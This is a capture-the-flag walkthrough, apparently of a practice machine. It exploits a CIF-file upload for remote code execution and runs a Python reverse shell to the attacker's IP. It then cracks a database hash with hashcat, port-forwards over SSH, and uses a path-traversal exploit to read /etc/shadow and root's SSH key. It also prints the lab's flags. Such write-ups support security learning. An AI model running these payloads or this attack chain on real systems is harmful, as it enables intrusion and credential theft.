### Stuff to learn in this box 
	1. CIF files_ 
	2. Enumeration with `netstat` (`ss`) 
	3. Port Forewarding

Do an `nmap` scan `nmap -A $box`
We found a webserver on port **5000**

Let's see what's there
![[Pasted image 20250310091417.png]]
We a paga that analyze **[CIF](https://en.wikipedia.org/wiki/Crystallographic_Information_File)** files, let's register an account, and login

![[Pasted image 20250310091455.png]]
We found an upload functionality for CIF files only, we also have an example there

Search for exploit for CIF file, we found this **[CVE-2024-23346](https://github.com/9carlo6/CVE-2024-23346)** 
Follow the instruction in the GitHub exploit page

Test for connection with `curl` in the system function using our IP:
![[Pasted image 20250310111649.png]]

Establish an HTTP python server on your machine, then **upload** the file and **view** it:
![[Pasted image 20250310112012.png]]
We have a connection which means we've got an **RCE**

Create a file and put a python reverse shell in it (I tried a lot of reverse shells only python worked)
Also sounds like we have to put our reverse shell in a different file then call it from the CIF file
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.34",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```
Don't forget to change your IP and port

Then change the `vuln.cif` file to grab the file we put the reverse shell in `pwn`, then use `python3`  ![[Screenshot 2025-03-10 112439.png]]

Now open a `netcat` listener on the port you chose, and a python server at the same time
Then upload the file and view it
![[Pasted image 20250310111410.png]]
Cool! we've got a reverse shell!

Use `find` to search for any .db files, then use `sqlite3` to get in the database then retrieve all users, as shown in the screenshot below
![[Pasted image 20250310095223.png]]
We've found a lot of users, we can crack them all but what we need is Rosa's password, I'm pretty sure the root password is uncrackable.

Why Rosa? if we cat out the /etc/passwd file we'll see that it's the only user which has a shell of `/bin/bash`

Sounds like MD5 hashing, let's crack it using `hashcat` 
`hashcat -m 0 '63ed86ee9f624c7b14f1d4f43dc251a5' seclists/Passwords/rockyou.txt` 
![[Screenshot 2025-03-10 095551.png]]
**unicorniosrosados** is our password for **rosa**

Let's `ssh` using that password with rosa
![[Pasted image 20250310100156.png]]
We got access to rosa's shell

Cat out the user flag
![[Pasted image 20250310100234.png]]

**User Flag : 1b4a4bdd9b5961e6326a4e125007a679**

Let's do `ss -lntp` to check if there's any other ports on this box that didn't show up with `nmap`
![[Screenshot 2025-03-10 114436.png]]
There is , it's listening of the localhost on port 8080, since I have Burp suite listening on that port 

Let's forward the connection to another port e.g 8081, on your machine type
`ssh -L 8081:127.0.0.1:8080 rosa@10.10.11.38`, the enter Rosa's password
![[Screenshot 2025-03-10 115549.png]]

Now try to get to the localhost on port 8081![[Pasted image 20250310115901.png]]
Lots of useless stuff there

Open the network tab by clicking on F12, look for anything abnormal, we found this,
![[Screenshot 2025-03-11 222156.png]]
What is that? search about it online, And we found this **[CVE-2024-23334](https://github.com/z3rObyte/CVE-2024-23334-PoC)**, Download it and run it
We don't actually need to transfer it to the target machine because it interacts with our localhost since we forwarded it there

When we run the exploit, we get `404`![[Pasted image 20250311224416.png]]

By taking a look at the exploit, it's trying to get `/etc/passwd` file within the **/static** directory on the monitoring page on `localhost:8081`, But when we look at the source code of that page we don't see any **/static** dir instead we see **/assets** dir
![[Screenshot 2025-03-11 224455.png]]

So let's modify the **payload** variable to`/assets/` instead of `/static/` and try again
![[Screenshot 2025-03-11 224130.png]]

Run the exploit again ![[Pasted image 20250311224905.png]]
Cool! we got it!! But we don't need `/etc/passwd` file, we already can read it by Rosa user, we need `/etc/shadow` file that contains the root hash password

So let's modify the **File** variable from `etc/passwd` to `etc/shadow`, then run it again
![[Pasted image 20250311225256.png]]
Cool! we got it even though it's unreadable for anyone except root, if we try to crack the root password we probably can't do it, it's mostly impossible to be cracked, also we ignored it before!

What if we try to read the root flag immediately!![[Pasted image 20250311230431.png]]
Ooh! we did it! but it doesn't actually count as a Privilege Escalation

We can look for a root SSH key as we know the file name mostly is **id_rsa** or **authorized_keys**
![[Pasted image 20250311230843.png]]
We found both, even better!! 

Let's copy the **id_rsa** to a file in our machine and change it's permission to **600**
![[Screenshot 2025-03-11 231738.png]]

Now let's `ssh` to **root** using the **id_rsa** file ![[Pasted image 20250311232159.png]]
Cool!! Now we are root! We did a Privilege Escalation! that one definitely counts hah

Let's cat out the root flag![[Pasted image 20250311232301.png]]

**Root Flag : 38f323c4bdc0a1c5b2f50af766c52269**

**Congrats! You pwned the machine successfully!**
![[Pasted image 20250729102347.png]]